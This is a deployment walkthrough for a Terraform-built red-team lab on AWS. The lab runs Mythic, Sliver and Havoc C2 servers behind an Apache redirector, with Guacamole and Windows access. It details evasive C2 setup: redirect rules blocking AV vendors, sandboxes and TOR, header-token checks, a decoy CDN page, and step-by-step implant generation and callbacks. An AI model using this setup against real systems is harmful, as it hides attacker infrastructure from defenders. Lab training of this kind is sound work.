# redStack: A Boot-to-Breach Lab Environment for Red Team Operations

> [!WARNING]
> This is still very much in development! Please excuse the mess while I continue to get this to a more stable release version.

## Complete Deployment Walkthrough

**Purpose:** Step-by-step guide to deploy and verify your boot-to-breach lab environment
**Difficulty:** Intermediate to Advanced

---

## Table of Contents

- [Architecture Overview](#architecture-overview)
- [Pre-Deployment Checklist](#pre-deployment-checklist)
- [Part 1: Initial Deployment](#part-1-initial-deployment)
- [Part 2: Verification](#part-2-verification)
- [Part 3: Apache Redirector Configuration](#part-3-apache-redirector-configuration)
- [Part 4: Mythic C2 Setup](#part-4-mythic-c2-setup)
- [Part 5: Sliver C2 Setup](#part-5-sliver-c2-setup)
- [Part 6: Havoc C2 Setup](#part-6-havoc-c2-setup)
- [Part 7: Final Validation](#part-7-final-validation)
- [Part 8: External Target Environments (HTB/THM/ProvingGrounds)](#part-8-external-target-environments-htbthmprovinggrounds)
- [Troubleshooting](#troubleshooting)

---

## Architecture Overview

```bash
+---------------------------------------------------------------------+
|                     NETWORK ARCHITECTURE                            |
+---------------------------------------------------------------------+

VPC A - Team Server Infrastructure (10.50.0.0/16 or Default VPC)
├── mythic       - Mythic Team Server     (Debian 12 - internal only, no public IP)
├── sliver       - Sliver C2 Server       (Debian 12 - internal only, no public IP)
├── havoc        - Havoc C2 Server        (Debian 12 - internal only, no public IP)
├── guac         - Guacamole Server       (Debian 12 - Elastic IP, public facing)
└── WIN-OPERATOR - Windows Workstation    (internal only - RDP via Guacamole)

VPC B - Redirector Infrastructure (10.60.0.0/16)
└── redirector   - Apache Redirector      (Debian 12 - Elastic IP, public facing)

VPC Peering: VPC A ←→ VPC B

Traffic Flow (Header + URI Validation - ports 80/443):
[Target] → /cdn/media/stream/    → Redirector → Mythic
[Target] → /cloud/storage/objects/ → Redirector → Sliver
[Target] → /edge/cache/assets/   → Redirector → Havoc
Required: X-Request-ID: <auto-generated-token>
No header: Decoy page (CloudEdge CDN maintenance)

Security Posture:
✓ ALL C2 servers have NO public IPs (internal only)
✓ Full internal mesh - all lab machines can reach each other (ping/SSH/any)
✓ Redirector in separate VPC (simulates external provider isolation)
✓ Header validation (X-Request-ID + token) required for C2 proxy
✓ URI prefix routing with CDN/cloud-style paths
✓ redirect.rules: AV vendors, TOR exits blocked (403); cloud IPs commented out for AWS compatibility
✓ Decoy page served to requests without valid C2 header
✓ All hosts have descriptive hostnames and /etc/hosts entries for name resolution
```

> **Tip:** After deployment, run `terraform output network_architecture` to see this diagram populated with your actual IP addresses.

---

## Pre-Deployment Checklist

### Prerequisites

- [ ] AWS account with IAM credentials
- [ ] AWS CLI installed and configured
- [ ] Terraform >= 1.0 installed
- [ ] Your public IP obtained
- [ ] SSH key pair created in AWS EC2 (see Step 0.3 below)
- [ ] redstack_tf package extracted

### Step 0.1: Install AWS CLI & Terraform

**Install AWS CLI:**

| Platform | Command |
| -------- | ------- |
| macOS | `brew install awscli` |
| Linux (Ubuntu/Debian) | `sudo apt install awscli` |
| Linux (any) | `curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" && unzip awscliv2.zip && sudo ./aws/install` |
| Windows | Download and run the MSI installer from <https://aws.amazon.com/cli/> |

**Configure AWS CLI:**

```bash
aws configure
```

You will be prompted for:

- **AWS Access Key ID** - from IAM Console → Users → Security credentials
- **AWS Secret Access Key** - shown once when creating the access key
- **Default region name** - `us-east-1` (or your preferred region)
- **Default output format** - `json`

> **Note:** If you don't have an access key yet, create one in the AWS Console:
> IAM → Users → [your user] → Security credentials → Create access key → CLI use case

**Install Terraform:**

| Platform | Command |
| -------- | ------- |
| macOS | `brew install terraform` |
| Linux (Ubuntu/Debian) | See <https://developer.hashicorp.com/terraform/install> |
| Windows | `choco install terraform` or download from <https://developer.hashicorp.com/terraform/install> |

**Checkpoint:** ✅ AWS CLI and Terraform installed

### Step 0.2: Verification Commands

```bash
# Check AWS access
aws sts get-caller-identity

# Check Terraform
terraform --version

# Get your public IP
curl ifconfig.me
```

**Expected Results:**

- AWS CLI returns your account details (Account, Arn, UserId)
- Terraform version 1.0 or higher
- Public IP address displayed

**Checkpoint:** ✅ AWS CLI and Terraform working, public IP noted

### Step 0.3: Create AWS SSH Key Pair (Required)

**Terraform does NOT create the SSH key pair - you must create it manually first.**

### Option 1: AWS Console (Recommended)

1. Open AWS Console → EC2 → Key Pairs
2. Click "Create key pair"
3. Name: `rs-rsa-key` (or your preferred name)
4. Key type: RSA
5. File format: `.pem` (for Linux/Mac) or `.ppk` (for PuTTY)
6. Click "Create key pair"
7. **Save the downloaded .pem file** - you cannot download it again!
8. Move to project folder: `mv ~/Downloads/rs-rsa-key.pem ./`
9. Set permissions: `chmod 400 ./rs-rsa-key.pem`

### Option 2: AWS CLI

```bash
# Create key pair and save to project folder
aws ec2 create-key-pair --key-name rs-rsa-key --query 'KeyMaterial' --output text > ./rs-rsa-key.pem

# Set correct permissions
chmod 400 ./rs-rsa-key.pem
```

**Verify key pair exists:**

```bash
aws ec2 describe-key-pairs --key-names rs-rsa-key
```

**Checkpoint:** ✅ SSH key pair created and .pem file saved

---

## Part 1: Initial Deployment

### Objective: AWS Infrastructure Deployment

Deploy all AWS infrastructure using Terraform: VPCs, security groups, EC2 instances (Mythic, Sliver, Havoc, Guacamole, Windows, Apache redirector).

### Step 1.1: Configure Terraform Variables

```bash
cd redstack_tf
cp terraform.tfvars.example terraform.tfvars
nano terraform.tfvars
```

**Required Changes:**

```hcl
localPub_ip              = "YOUR_IP/32"           # Replace with your IP + /32
ssh_key_name             = "rs-rsa-key"            # Must match your AWS key pair name
ssh_private_key_path     = "./rs-rsa-key.pem"      # Path to your .pem file (for Windows password decryption)
redirector_domain        = "c2.yourdomain.com"    # Your domain for the redirector
enable_external_vpn      = false                   # Set to true for HTB/THM/ProvingGrounds access (see Part 8)
```

**Note:** Passwords are auto-generated during deployment. A single random password is used for SSH and Guacamole admin access. The Windows Administrator password is generated by AWS and decrypted automatically using your SSH private key. Retrieve credentials after deployment with:

```bash
terraform output deployment_info
```

**Checkpoint:** ✅ File saved with your actual values

### Step 1.2: Initialize Terraform

```bash
terraform init
```

**Expected Output:**

```bash
Initializing the backend...
Initializing provider plugins...
- Finding hashicorp/aws versions matching "~> 5.0"...
- Installing hashicorp/aws v5.x.x...
Terraform has been successfully initialized!
```

**Checkpoint:** ✅ No errors, providers downloaded

### Step 1.3: Review Deployment Plan

```bash
terraform plan
```

**Expected Output:**

- **~50+ resources** to be created
- 6 EC2 instances (Mythic, Sliver, Havoc, Guacamole, Windows, Redirector)
- 2 VPCs (team server VPC + redirector VPC)
- 2 Elastic IPs (Guacamole, Redirector) - **static, persistent IPs**
- Mythic, Sliver, and Havoc have **no public IPs** (internal only)
- Security groups, VPC peering, route tables
- No errors or warnings

**Checkpoint:** ✅ Plan shows expected resources

### Step 1.4: Deploy Infrastructure

```bash
terraform apply
```

Type `yes` when prompted.

**Expected Output:**

```bash
Apply complete! Resources: 50+ added, 0 changed, 0 destroyed.
```

**Checkpoint:** ✅ Terraform apply completed successfully

### Step 1.5: Save Deployment Information

```bash
terraform output > deployment_info.txt
terraform output network_architecture
```

**Checkpoint:** ✅ Output saved, network diagram displayed

### Step 1.6: Point Domain to Redirector

After deployment, you need to point your domain's DNS to the redirector's Elastic IP so that Certbot can obtain a valid SSL certificate.

**Get the Redirector IP:**

```bash
terraform output -json vps_redirector | jq -r '.public_ip'
```

**Create a DNS A Record:**

1. Log into your domain registrar or DNS provider (e.g., Namecheap, Cloudflare, Route53)
2. Navigate to DNS settings for your domain
3. Create an **A record**:
   - **Host/Name:** The subdomain portion (e.g., `c2` if your domain is `c2.yourdomain.com`)
   - **Value/Points to:** The redirector's Elastic IP from the command above
   - **TTL:** 300 (5 minutes) or lowest available

**Verify DNS Propagation:**

```bash
# Check if the domain resolves to the redirector IP
nslookup c2.yourdomain.com
# or
dig +short c2.yourdomain.com
```

**Expected:** The IP returned should match your redirector's Elastic IP.

> **Note:** DNS propagation can vary. After DNS resolves correctly, run Certbot on the redirector (see Step 2.4):
>
> ```bash
> sudo certbot --apache -d c2.yourdomain.com
> ```

**Checkpoint:** ✅ Domain pointed to redirector IP, DNS verified

### Wait Time: 5-10 Minutes

**Why:** User data scripts are installing software on multiple servers

**What's Happening:**

- All hosts: Setting descriptive hostnames and populating /etc/hosts for cross-host name resolution
- Mythic (`mythic`): Installing Docker, cloning Mythic, starting ~10 containers (Debian 12)
- Sliver (`sliver`): Installing Sliver C2 server binary, configuring firewall (Debian 12)
- Havoc (`havoc`): Installing Go, cloning and building Havoc teamserver from source (Debian 12)
- Guacamole (`guac`): Setting up PostgreSQL, Nginx, Docker containers (Debian 12)
- Windows (`WIN-OPERATOR`): Disabling Defender/Firewall, enabling RDP, installing tools (Chromium, VS Code, MobaXterm, 7-Zip)
- Redirector (`redirector`): Installing Apache with mod_rewrite/proxy, configuring header+URI validation, downloading redirect.rules, setting up SSL and decoy page (Debian 12, fully automated)

---

## Part 2: Verification

### Objective: Component Verification

Verify all six components are operational and accessible.

### Step 2.1: Verify Mythic Team Server

Mythic is internal only (no public IP). Access it via Guacamole SSH or from another instance in the VPC.

**Access via Guacamole:**

1. Open Guacamole UI
2. Click **"Mythic C2 Server (SSH)"**
3. Should connect automatically

**Or via direct SSH (instructor only):**

```bash
MYTHIC_IP=$(terraform output -json mythic_server | jq -r '.private_ip')
ssh -i your-key.pem admin@$MYTHIC_IP
```

**Check Mythic Status:**

```bash
cd /opt/Mythic
sudo ./mythic-cli status
```

**Expected Output:**

```bash
Mythic Main Server: Running (port 7443)
Mythic Postgres: Running
Mythic RabbitMQ: Running
Mythic Documentation: Running
...
[Total: 10-12 containers running]
```

**Get Admin Password:**

```bash
sudo cat .env | grep MYTHIC_ADMIN_PASSWORD
```

**Checkpoint:** ✅ 10+ containers running, password obtained

**Access Web UI (via Windows workstation or Guacamole):**

The Mythic Web UI at `https://<MYTHIC_PRIVATE_IP>:7443` is only accessible from within the VPC. Use the Windows operator workstation (via Guacamole RDP) to open a browser and navigate to:

```text
https://<MYTHIC_PRIVATE_IP>:7443
```

- Login: `mythic_admin`
- Password: [from above command]

**Checkpoint:** ✅ Mythic UI accessible, can login

### Step 2.2: Verify Guacamole Access Portal

**Get Connection Info:**

```bash
GUAC_IP=$(terraform output -json guacamole_server | jq -r '.public_ip')
```

**SSH to Guacamole:**

```bash
ssh -i your-key.pem admin@$GUAC_IP
```

**Check Docker Containers:**

```bash
docker ps
```

**Expected Output:**

```bash
CONTAINER ID   IMAGE                   STATUS
xxxxx          guacamole/guacamole     Up X minutes
xxxxx          postgres:15             Up X minutes
xxxxx          guacamole/guacd         Up X minutes
```

**Checkpoint:** ✅ 3 containers running

```bash
exit  # Exit SSH
```

**Access Guacamole UI:**

```bash
echo "https://$GUAC_IP/guacamole"
# Open in browser
```

**Login Credentials:**

- Username: `guacadmin`
- Password: run `terraform output lab_password`

**Checkpoint:** ✅ Guacamole UI accessible, can login

**Verify Auto-Created Connections:**

After logging in, you should see **6 pre-configured connections**:

1. **Windows Operator Workstation** (RDP) - auto-connects with Administrator credentials
2. **Mythic C2 Server (SSH)** - green-black terminal theme
3. **Guacamole Server (SSH)** - green-black terminal theme
4. **Apache Redirector (SSH)** - green-black terminal theme
5. **Sliver C2 Server (SSH)** - green-black terminal theme
6. **Havoc C2 Server (SSH)** - green-black terminal theme

All SSH connections use password authentication (no SSH keys needed) and are pre-configured with the auto-generated lab password. The Windows RDP connection uses the default AWS `Administrator` account with an auto-decrypted password (no manual entry needed).

**Checkpoint:** ✅ All 6 connections visible in Guacamole UI

### Step 2.3: Verify Windows Operator Workstation

The Windows instance uses the default AWS `Administrator` account. The password is automatically generated by AWS, decrypted by Terraform using your SSH private key, and passed to the Guacamole RDP connection.

**Access via Guacamole:**

1. Open Guacamole UI
2. Click **"Windows Operator Workstation"**
3. RDP connects automatically (credentials are pre-configured)
4. Wait 10-30 seconds for RDP connection

**Expected:**

- Windows desktop loads
- Logged in as `Administrator` (local admin)
- Chromium, VS Code, MobaXterm, and 7-Zip installed

**Checkpoint:** ✅ Can RDP into Windows via Guacamole, tools available

**If Connection Fails:**

- Wait 5 more minutes (Windows setup is slowest)
- Check instance state: `aws ec2 describe-instances --instance-ids $(terraform output -json windows_client | jq -r '.instance_id') --query 'Reservations[0].Instances[0].State.Name'`
- Should show `"running"`

### Step 2.4: Verify Apache Redirector

The redirector is **fully automated** — Apache, header validation, URI routing, redirect.rules, the decoy page, and SSL are all configured during deployment. No manual setup is needed.

**Get Connection Info:**

```bash
REDIR_IP=$(terraform output -json vps_redirector | jq -r '.public_ip')
```

**SSH to Redirector (via Guacamole or direct SSH):**

```bash
ssh -i your-key.pem admin@$REDIR_IP
```

**What's Pre-Configured:**

- Apache2 with modules: rewrite, ssl, proxy, proxy_http, headers, deflate
- Header validation (`X-Request-ID` + auto-generated token) — requests without the correct header get a decoy page
- URI prefix routing to each C2 server (CDN/cloud-style paths)
- [redirect.rules](https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10) (adapted) — blocks AV vendors, cloud sandboxes, TOR exit nodes (403 Forbidden)
- CloudEdge CDN maintenance decoy page (served when header validation fails)
- Self-signed SSL certificate (placeholder until Certbot is configured)
- UFW firewall (ports 22, 80, 443)
- Certbot installed and ready for Let's Encrypt

**URI Routing (configured automatically, all on ports 80/443):**

| URI Prefix | Backend C2 Server |
| ---------- | ----------------- |
| `/cdn/media/stream/` | Mythic |
| `/cloud/storage/objects/` | Sliver |
| `/edge/cache/assets/` | Havoc |

**Header Validation:**

All C2 traffic must include the correct header to pass through the redirector:

```bash
# Get the required header from terraform output
terraform output deployment_info | grep "C2 Header"
# Example: X-Request-ID: a1b2c3d4e5f6...
```

Requests without the header (or with the wrong value) receive the decoy page instead of being proxied.

**Run Connectivity Test:**

A test script is pre-installed on the redirector:

```bash
sudo /root/test_redirector.sh
```

This tests Apache status, VirtualHost configuration, and connectivity to all three C2 backend servers.

**Verify redirect.rules:**

```bash
# Check how many blocking rules are installed
grep -c 'RewriteCond' /etc/apache2/redirect.rules
```

The redirect.rules file is downloaded at boot time from the redStack GitHub repo (adapted from [curi0usJack's gist](https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10)) and returns 403 Forbidden for known security scanners, AV vendor IPs, and TOR exit nodes.

> **Note:** AWS and Azure cloud IP blocks are **commented out by default** in redirect.rules because this lab runs in AWS. Blocking cloud subnets would prevent C2 callbacks from reaching the redirector. If you deploy outside of cloud environments, you can re-enable them by uncommenting the relevant sections in `/etc/apache2/redirect.rules`:
>
> ```bash
> # On the redirector, edit the rules file:
> sudo nano /etc/apache2/redirect.rules
>
> # Uncomment the following sections:
> #   - "Class A Exclusions" (AWS/Azure /8 ranges)
> #   - "AWS Fine Grained" (specific AWS subnets)
> #   - "Azure" (Azure subnets)
> #   - "Other VT hosts" (VirusTotal analysis hosts)
>
> # Then reload Apache:
> sudo systemctl reload apache2
> ```

**Checkpoint:** ✅ Apache running, header+URI validation active, redirect.rules blocking scanners

**Obtain SSL Certificate (after DNS is pointed):**

```bash
sudo certbot --apache -d c2.yourdomain.com
```

```bash
exit  # Exit SSH
```

### Step 2.5: Verify Sliver C2 Server

**Access via Guacamole:**

1. Open Guacamole UI
2. Click **"Sliver C2 Server (SSH)"**
3. Should connect automatically

**Or via SSH from the redirector:**

```bash
ssh -i your-key.pem admin@$REDIR_IP
SLIVER_IP=$(terraform output -json sliver_server | jq -r '.private_ip')
ssh admin@$SLIVER_IP
```

**Run Quick Start:**

```bash
sudo /root/sliver_quickstart.sh
```

**Verify Sliver is installed:**

```bash
which sliver-server
```

**Checkpoint:** ✅ Sliver C2 server installed, accessible via Guacamole

### Step 2.6: Verify Havoc C2 Server

**Access via Guacamole:**

1. Open Guacamole UI
2. Click **"Havoc C2 Server (SSH)"**
3. Should connect automatically

**Run Quick Start:**

```bash
sudo /root/havoc_quickstart.sh
```

**Start the Havoc Teamserver:**

```bash
sudo systemctl start havoc
sudo systemctl status havoc
```

**Checkpoint:** ✅ Havoc C2 teamserver running, accessible via Guacamole

### Step 2.7: Verify SSH Connections via Guacamole

**Test SSH Access:**

1. Open Guacamole UI
2. Click **"Mythic C2 Server (SSH)"**
3. Should connect without prompting for credentials
4. Prompt should show `admin@mythic:~$`
5. Run: `whoami` → Should show `admin`
6. Run: `ping sliver` → Should resolve to Sliver's private IP (verifies /etc/hosts)
7. Disconnect

**Repeat for:**

- **"Guacamole Server (SSH)"** → prompt: `admin@guac:~$`
- **"Apache Redirector (SSH)"** → prompt: `admin@redirector:~$`
- **"Sliver C2 Server (SSH)"** → prompt: `admin@sliver:~$`
- **"Havoc C2 Server (SSH)"** → prompt: `admin@havoc:~$`

**Checkpoint:** ✅ All SSH connections work via Guacamole

**Verify SSH Security:**

All Linux servers (Debian 12, SSH user: `admin`) are configured with dual SSH authentication:

- **From Public IPs:** SSH keys REQUIRED (password authentication disabled)
- **From VPC IPs (10.50.0.0/16, 172.31.0.0/16):** Password authentication ALLOWED

This means:

- ✅ Guacamole can SSH with passwords (it's in the VPC)
- ✅ Your SSH key still works from your public IP
- ❌ Random internet users cannot brute-force SSH passwords

**Checkpoint:** ✅ Understand SSH security model

---

## Part 3: Apache Redirector Configuration

### Objective: Understand Redirector Security Layers

The redirector is pre-configured with multiple security layers. This section explains how they work and how to customize them.

### Step 3.1: Review Configuration

**SSH to redirector:**

```bash
ssh -i your-key.pem admin@$REDIR_IP
```

**View Active VirtualHosts:**

```bash
sudo apache2ctl -S
```

This shows all configured VirtualHosts (HTTP and HTTPS on ports 80/443).

**View HTTP Config (all C2 routes in one file):**

```bash
sudo cat /etc/apache2/sites-available/redirector-http.conf
```

**View HTTPS Config:**

```bash
sudo cat /etc/apache2/sites-available/redirector-https.conf
```

Each VirtualHost uses three security layers before proxying traffic:

1. **redirect.rules** — Blocks known AV vendors, cloud sandboxes, security scanners, and TOR exit nodes (returns 403)
2. **Header validation** — Requires `X-Request-ID` header with a specific token value
3. **URI prefix routing** — Only matching URI prefixes are proxied to C2 backends

**Checkpoint:** ✅ Understand the three-layer security model

### Step 3.2: Security Layer Details

#### Layer 1: redirect.rules (Automated Scanner Blocking)

The file `/etc/apache2/redirect.rules` is downloaded at boot from the [redStack GitHub repo](https://github.com/BaddKharma/redStack), which maintains an adapted version of [curi0usJack's redirect rules](https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10):

- All `302` redirects replaced with `403 Forbidden` responses
- Setup directives stripped (`Define REDIR_TARGET`, `RewriteEngine On`, `RewriteOptions Inherit`)
- AWS/Azure/cloud IP blocks **commented out** (would block our own AWS-hosted C2 callbacks)
- Included in both HTTP and HTTPS VirtualHosts via `Include /etc/apache2/redirect.rules`

```bash
# Check installed rules
grep -c 'RewriteCond' /etc/apache2/redirect.rules
```

To update redirect.rules manually:

```bash
# Re-download from redStack repo
curl -sL "https://raw.githubusercontent.com/BaddKharma/redStack/main/setup_scripts/redirect.rules" \
  -o /etc/apache2/redirect.rules
sudo systemctl reload apache2
```

### Layer 2: Header Validation

Requests must include the correct `X-Request-ID` header. Without it, Apache serves the CloudEdge CDN decoy page instead of proxying to C2 backends.

```bash
# Get required header value
terraform output deployment_info | grep "C2 Header"
```

**Layer 3: URI Prefix Routing**

| URI Prefix | Backend | Example |
| ---------- | ------- | ------- |
| `/cdn/media/stream/` | Mythic | `/cdn/media/stream/callback` → Mythic `/callback` |
| `/cloud/storage/objects/` | Sliver | `/cloud/storage/objects/session` → Sliver `/session` |
| `/edge/cache/assets/` | Havoc | `/edge/cache/assets/beacon` → Havoc `/beacon` |

The URI prefix is stripped before forwarding to the backend C2 server.

**Checkpoint:** ✅ Understand header validation, URI routing, and scanner blocking

### Step 3.3: Test the Security Layers

```bash
# Should get DECOY PAGE (no header)
curl -k https://$REDIR_IP/

# Should get DECOY PAGE (wrong header value)
curl -k -H "X-Request-ID: wrong-value" https://$REDIR_IP/cdn/media/stream/test

# Should be PROXIED (correct header + URI prefix)
HEADER_VALUE=$(terraform output deployment_info | grep "C2 Header" | awk '{print $NF}')
curl -k -H "X-Request-ID: $HEADER_VALUE" https://$REDIR_IP/cdn/media/stream/test
```

**Checkpoint:** ✅ Security layers verified

### Step 3.4: Review Logs

All C2 traffic is logged to a single access/error log pair:

```bash
ssh -i your-key.pem admin@$REDIR_IP

# Access log (differentiate C2 traffic by URI prefix in the request)
sudo tail -50 /var/log/apache2/redirector-access.log
sudo tail -50 /var/log/apache2/redirector-error.log
```

**Checkpoint:** ✅ Redirector logging understood

---

## Part 4: Mythic C2 Setup

### Objective: Mythic Listener and Agent Generation

Configure Mythic HTTP listener and generate test agent.

### Step 4.1: Create HTTP Listener

**Access Mythic UI (from Windows workstation via Guacamole RDP):**

```text
https://<MYTHIC_PRIVATE_IP>:7443
```

**Navigate:** C2 Profiles → HTTP

**Click:** "New Listener"

**Configuration:**

| Setting | Value |
| ------- | ----- |
| Callback Host | `REDIR_IP` (your redirector public IP) |
| Callback Port | `80` |
| Callback Interval | `10` |
| Callback Jitter | `20` |
| User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64)` |
| GET URI | `/cdn/media/stream/status` |
| POST URI | `/cdn/media/stream/update` |
| Headers | `X-Request-ID: <token from terraform output>` |

**Click:** "Submit" then "Start"

**Checkpoint:** ✅ Listener shows "Running"

### Step 4.2: Generate Agent

**Navigate:** Payloads → Generate New

**Configuration:**

| Setting | Value |
| ------- | ----- |
| Agent | `Apollo` |
| C2 Profile | Select your HTTP listener |
| Commands | Select: `shell`, `download`, `upload`, `screenshot` |
| Operating System | `Windows` |
| Output Format | `Windows Executable (.exe)` |

**Click:** "Generate"

**Wait:** 30-60 seconds

**Download:** Click "Download" button

**Checkpoint:** ✅ Agent downloaded (filename like `apollo.exe`)

### Step 4.3: Deploy Agent

**Access Windows Workstation:**

1. Open Guacamole UI
2. Click "Windows Operator Workstation"
3. Use file transfer to upload `apollo.exe`

**Or use Guacamole's file share:**

- Left sidebar → Devices → Shared Drive
- Copy agent to shared folder

**Execute Agent:**

```powershell
cd Downloads  # Or wherever you uploaded
.\apollo.exe
```

**Watch Mythic UI:**

- Navigate to: Active Callbacks
- Should see new callback appear within ~10 seconds

**Expected:**

```bash
Hostname: WIN-XXXXXXX
User: Administrator
IP: 172.31.X.X
```

**Checkpoint:** ✅ Agent callback received

### Step 4.4: Test C2 Session

### In Mythic, click the callback

**Test Commands:**

```bash
Task: shell
Command: whoami
```

**Expected Output:** `win-operator\administrator`

**Verify Redirector Traffic:**

```bash
ssh admin@$REDIR_IP
sudo tail -f /var/log/apache2/redirector-access.log
```

**Look for:** Regular GET/POST requests to `/cdn/media/stream/status` and `/cdn/media/stream/update`

**Checkpoint:** ✅ C2 traffic flowing through redirector to Mythic

---

## Part 5: Sliver C2 Setup

### Objective: Sliver Operator and Listener Setup

Configure Sliver C2 server, generate an operator config, and create a listener.

### Step 5.1: Access Sliver Server

**Via Guacamole:** Click **"Sliver C2 Server (SSH)"**

**Or via SSH:**

```bash
SLIVER_IP=$(terraform output -json sliver_server | jq -r '.private_ip')
ssh -i your-key.pem admin@$REDIR_IP  # Jump through redirector
ssh admin@$SLIVER_IP
```

### Step 5.2: Generate Operator Config

```bash
sudo /root/generate_operator_config.sh operator1
```

This creates `/root/operator1.cfg` — transfer this file to your machine to connect using the Sliver client.

**Checkpoint:** ✅ Operator config generated

### Step 5.3: Start Sliver Console and Create Listener

```bash
sliver-server
```

**In the Sliver console:**

```bash
sliver > http --lhost 0.0.0.0 --lport 80
```

This starts an HTTP listener on port 80. The redirector forwards traffic from the `/cloud/storage/objects/` URI prefix to this listener.

**Checkpoint:** ✅ Sliver HTTP listener running

### Step 5.4: Generate Implant

**In the Sliver console:**

```bash
sliver > generate --http https://REDIR_DOMAIN/cloud/storage/objects/ --os windows --arch amd64 --format exe --save /tmp/implant.exe
```

Replace `REDIR_DOMAIN` with your redirector's domain (e.g., `c2.yourdomain.com`). The `/cloud/storage/objects/` prefix is stripped by the redirector before forwarding to Sliver.

> **Note:** The implant must also send the `X-Request-ID` header with the correct token value. Configure this in the Sliver HTTP C2 profile or use Sliver's `--header` flag if available.

Transfer the implant to the Windows workstation and execute it. You should see a new session appear in the Sliver console.

**Checkpoint:** ✅ Sliver implant calling back through redirector

### Step 5.5: Test Sliver Session

```bash
sliver > sessions

sliver > use [SESSION_ID]

sliver (SESSION) > whoami
sliver (SESSION) > pwd
```

**Verify Redirector Traffic:**

```bash
sudo tail -f /var/log/apache2/redirector-access.log
```

**Checkpoint:** ✅ Sliver C2 operational through redirector URI prefix /cloud/storage/objects/

---

## Part 6: Havoc C2 Setup

### Objective: Havoc Teamserver Configuration

Configure Havoc C2 teamserver and connect with the Havoc client.

### Step 6.1: Start Havoc Teamserver

**Via Guacamole:** Click **"Havoc C2 Server (SSH)"**

```bash
sudo systemctl start havoc
sudo systemctl status havoc
```

The teamserver starts on port 40056 with the default profile at `/opt/Havoc/profiles/default.yaotl`.

**Default Operator Credentials:**

- Username: `operator`
- Password: `Training123!`

**Checkpoint:** ✅ Havoc teamserver running on port 40056

### Step 6.2: Connect Havoc Client

The Havoc client is a Qt-based GUI application that runs on the Windows operator workstation.

**From the Windows Operator Workstation:**

1. Download the Havoc client from the [Havoc GitHub releases](https://github.com/HavocFramework/Havoc)
2. Connect to the teamserver:
   - **Host:** Havoc server private IP (from `terraform output -json havoc_server | jq -r '.private_ip'`)
   - **Port:** 40056
   - **Username:** operator
   - **Password:** Training123!

**Checkpoint:** ✅ Havoc client connected to teamserver

### Step 6.3: Create Listener and Generate Demon

**In the Havoc client:**

1. Navigate to: Listeners → Add
2. The default profile already includes an HTTP listener on port 80
3. The redirector forwards traffic from the `/edge/cache/assets/` URI prefix to this listener

**Generate a Demon (Havoc implant):**

1. Navigate to: Payloads → Generate
2. Configure the callback host as `https://REDIR_DOMAIN/edge/cache/assets/` (your redirector domain)
3. Ensure the implant sends the `X-Request-ID` header with the correct token value (from `terraform output deployment_info`)
4. Generate and transfer to the Windows workstation

**Checkpoint:** ✅ Havoc Demon calling back through redirector URI prefix /edge/cache/assets/

---

## Part 7: Final Validation

### Objective: Complete Infrastructure Validation

Verify complete infrastructure and security posture.

### Step 7.1: Test Security Isolation

**Critical Test - C2 Servers Should NOT Be Directly Accessible:**

All three C2 servers (Mythic, Sliver, Havoc) have no public IPs and are unreachable from the internet by design. They can only be accessed internally via Guacamole or through the redirector's VPC peering.

**Expected:** No C2 server has a public IP. All C2 traffic must flow through the Apache redirector.

**Checkpoint:** ✅ C2 servers not directly accessible (GOOD!)

**Verify Redirector CAN Reach All C2 Servers:**

```bash
ssh admin@$REDIR_IP

MYTHIC_PRIVATE=$(terraform output -json mythic_server | jq -r '.private_ip')
SLIVER_PRIVATE=$(terraform output -json sliver_server | jq -r '.private_ip')
HAVOC_PRIVATE=$(terraform output -json havoc_server | jq -r '.private_ip')

curl -I http://$MYTHIC_PRIVATE/
curl -I http://$SLIVER_PRIVATE/
curl -I http://$HAVOC_PRIVATE/
```

**Expected:** HTTP response (200, 404, or connection refused if no listener is running yet)

**Checkpoint:** ✅ Redirector can reach all C2 servers via private IPs

### Step 7.2: Verify All Agent Callbacks

**Check across all C2 frameworks:**

- Mythic: Active Callbacks page in the web UI
- Sliver: `sessions` command in the Sliver console
- Havoc: Active sessions in the Havoc client

**Checkpoint:** ✅ All C2 callback paths functional

### Step 7.3: Review Redirector Logs

**All C2 traffic flows through the redirector with separate logs:**

```bash
ssh admin@$REDIR_IP

# Mythic traffic (port 80/443)
sudo tail -20 /var/log/apache2/redirector-access.log

# All C2 traffic is in the same log (differentiate by URI prefix)
# /cdn/media/stream/ = Mythic, /cloud/storage/objects/ = Sliver, /edge/cache/assets/ = Havoc
```

**Checkpoint:** ✅ Redirector logging understood for all C2 servers

### Step 7.4: Document Deployment

```bash
cat > deployment_summary.txt <<EOF
REDSTACK DEPLOYMENT COMPLETE
========================
Deployment Date: $(date)

INFRASTRUCTURE (6 EC2 instances):
- Mythic C2:    internal only (access via Guacamole)
- Sliver C2:    internal only (access via Guacamole)
- Havoc C2:     internal only (access via Guacamole)
- Guacamole:    $GUAC_IP (public)
- Windows:      internal only (RDP via Guacamole)
- Redirector:   $REDIR_IP (public)

REDIRECTOR URI ROUTING (all on ports 80/443):
- /cdn/media/stream/      -> Mythic
- /cloud/storage/objects/  -> Sliver
- /edge/cache/assets/      -> Havoc

CREDENTIALS:
- Lab Password: [run terraform output lab_password]
- Mythic: mythic_admin / [check .env]
- Guacamole: guacadmin / [lab password]
- Windows: Administrator / [auto-decrypted, see terraform output deployment_info]
- Havoc: operator / Training123!

STATUS: All systems operational
EOF

cat deployment_summary.txt
```

**Checkpoint:** ✅ Deployment documented

---

## Troubleshooting

### Guacamole Connections Not Auto-Created

**Symptoms:** Some or all of the 6 connections don't appear in Guacamole UI after deployment

**Root Cause:** Previous versions had a bug where the setup script used incorrect database backend ('mysql' instead of 'postgresql')

**Solution:**

```bash
# SSH to Guacamole server
ssh -i your-key.pem admin@$GUAC_IP

# Check if connections exist
docker exec -it postgres_guacamole psql -U guacamole_user -d guacamole_db \
  -c "SELECT connection_id, connection_name, protocol FROM guacamole_connection;"
```

**Expected:** Should show 6 connections (1 RDP, 5 SSH)

**If Missing, Manually Create via Guacamole UI:**

1. Log into Guacamole web UI
2. Settings (top right) → Connections → New Connection

**SSH Connections (for any missing C2 server):**

- Name: `Sliver C2 Server (SSH)` or `Havoc C2 Server (SSH)`
- Protocol: SSH
- Hostname: [Private IP from terraform output]
- Port: 22
- Username: admin
- Password: [run `terraform output lab_password`]

**Fixed in Current Version:** The setup script correctly creates all 6 connections automatically

